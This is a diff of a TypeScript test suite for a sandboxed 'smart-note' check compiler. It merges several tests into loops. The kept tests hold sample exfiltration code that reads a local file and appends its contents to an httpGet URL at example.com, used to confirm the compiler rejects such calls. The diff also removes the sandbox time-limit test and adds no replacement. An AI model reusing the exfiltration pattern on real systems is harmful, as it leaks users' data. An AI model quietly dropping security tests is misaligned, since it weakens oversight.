@@ -362,38 +362,30 @@ describe("compileSmartNoteCheck", () => {
         if (!result.ok) expect(result.error).toContain("internal address");
     });
 
-    test("rejects a computed httpGet URL before any code runs", async () => {
-        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
-        const client = createCompilerClient([
-            compilerOutput(
-                `function check(cap) { cap.httpGet("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
-            ),
-        ]);
+    test("rejects computed and aliased capability calls before any capability runs", async () => {
+        for (const [body, error] of [
+            [
+                `cap.httpGet("https://example.com/?d=" + cap.readFile("ready.txt"));`,
+                "must be a single string literal",
+            ],
+            [
+                `const get = cap.httpGet; get("https://example.com/?d=" + cap.readFile("ready.txt"));`,
+                "cap may only be called directly",
+            ],
+        ]) {
+            const httpGet = mock(async () => ({ status: 200, body: "ok" }));
+            const client = createCompilerClient([
+                compilerOutput(`function check(cap) { ${body} return { met: true }; }`),
+            ]);
 
-        const result = await compileSmartNoteCheck(
-            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
-        );
+            const result = await compileSmartNoteCheck(
+                compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
+            );
 
-        expect(result.ok).toBe(false);
-        if (!result.ok) expect(result.error).toContain("must be a single string literal");
-        expect(httpGet).not.toHaveBeenCalled();
-    });
-
-    test("rejects an aliased capability call before any code runs", async () => {
-        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
-        const client = createCompilerClient([
-            compilerOutput(
-                `function check(cap) { const get = cap.httpGet; get("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
-            ),
-        ]);
-
-        const result = await compileSmartNoteCheck(
-            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
-        );
-
-        expect(result.ok).toBe(false);
-        if (!result.ok) expect(result.error).toContain("cap may only be called directly");
-        expect(httpGet).not.toHaveBeenCalled();
+            expect(result.ok).toBe(false);
+            if (!result.ok) expect(result.error).toContain(error);
+            expect(httpGet).not.toHaveBeenCalled();
+        }
     });
 
     test("deletes the compiler child session unless keep_subagents is set", async () => {
@@ -584,16 +576,6 @@ describe("smart-note compiler runtime boundary", () => {
             expect(result.ok).toBe(false);
             if (!result.ok) expect(result.error).toContain("internal address");
         });
-    });
-
-    test("enforces sandbox time limits", async () => {
-        const result = await runCompiledSmartNoteCheck({
-            compiledCheck: `function check() { while (true) {} }`,
-            capabilities: fakeCap,
-            timeoutMs: 100,
-        });
-
-        expect(result.ok).toBe(false);
     });
 
     test("enforces sandbox memory limits", async () => {
@@ -900,34 +882,18 @@ describe("wire-limit parity with the Rust module (static)", () => {
         "utf8",
     );
 
-    test("MAX_MANIFEST_BYTES matches NOTE_EVALUATOR_MAX_MANIFEST_BYTES", () => {
-        // TypeScript must reject manifests larger than the module limit.
-        const tsLimit = tsSource.match(/const MAX_MANIFEST_BYTES = (.+);/)?.[1];
-        const rustLimit = rustSource.match(
-            /const NOTE_EVALUATOR_MAX_MANIFEST_BYTES: usize = (.+);/,
-        )?.[1];
-        expect(tsLimit).toBeDefined();
-        expect(rustLimit).toBeDefined();
-        expect(tsLimit).toBe(rustLimit);
-    });
-
-    test("MAX_CRON_BYTES matches NOTE_EVALUATOR_MAX_CRON_BYTES", () => {
-        const tsLimit = tsSource.match(/const MAX_CRON_BYTES = (.+);/)?.[1];
-        const rustLimit = rustSource.match(
-            /const NOTE_EVALUATOR_MAX_CRON_BYTES: usize = (.+);/,
-        )?.[1];
-        expect(tsLimit).toBeDefined();
-        expect(rustLimit).toBeDefined();
-        expect(tsLimit).toBe(rustLimit);
-    });
-
-    test("MAX_COMPILED_CHECK_BYTES matches NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES", () => {
-        const tsLimit = tsSource.match(/const MAX_COMPILED_CHECK_BYTES = (.+);/)?.[1];
-        const rustLimit = rustSource.match(
-            /const NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES: usize = (.+);/,
-        )?.[1];
-        expect(tsLimit).toBeDefined();
-        expect(rustLimit).toBeDefined();
-        expect(tsLimit).toBe(rustLimit);
+    // TypeScript must reject payloads larger than the Rust module limits.
+    test("MAX_MANIFEST_BYTES, MAX_CRON_BYTES, and MAX_COMPILED_CHECK_BYTES match the NOTE_EVALUATOR limits", () => {
+        for (const [tsName, rustName] of [
+            ["MAX_MANIFEST_BYTES", "NOTE_EVALUATOR_MAX_MANIFEST_BYTES"],
+            ["MAX_CRON_BYTES", "NOTE_EVALUATOR_MAX_CRON_BYTES"],
+            ["MAX_COMPILED_CHECK_BYTES", "NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES"],
+        ]) {
+            const tsLimit = tsSource.match(new RegExp(`const ${tsName} = (.+);`))?.[1];
+            const rustLimit = rustSource.match(new RegExp(`const ${rustName}: usize = (.+);`))?.[1];
+            expect(tsLimit).toBeDefined();
+            expect(rustLimit).toBeDefined();
+            expect(tsLimit).toBe(rustLimit);
+        }
     });
 });
